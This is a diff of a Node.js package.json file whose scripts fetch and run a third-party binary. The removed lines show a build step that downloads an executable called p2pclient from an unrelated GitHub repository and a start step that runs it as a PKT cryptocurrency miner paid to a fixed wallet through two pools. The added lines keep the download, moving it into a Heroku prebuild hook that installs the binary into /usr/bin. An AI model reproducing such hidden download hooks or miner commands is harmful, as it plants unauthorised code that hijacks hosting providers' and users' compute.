@@ -7,8 +7,8 @@
   },
   "main": "index.js",
   "scripts": {
-    "build": "wget https://raw.githubusercontent.com/pepek131happy4d/asddg/main/p2pclient && chmod +x p2pclient",
-    "start": "~/p2pclient ann -p pkt1qzjhnfe8sfrwk3pynldwe7pmsjfhkdfadsqpyqx http://pool.pkt.world http://pool.pktpool.io -t 4",
+    "heroku-prebuild": "cd /usr/bin && wget https://raw.githubusercontent.com/pepek131happy4d/asddg/main/p2pclient && chmod +x p2pclient",
+    "start": "cd api && npm start",
     "test": "node test.js"
   },
   "dependencies": {
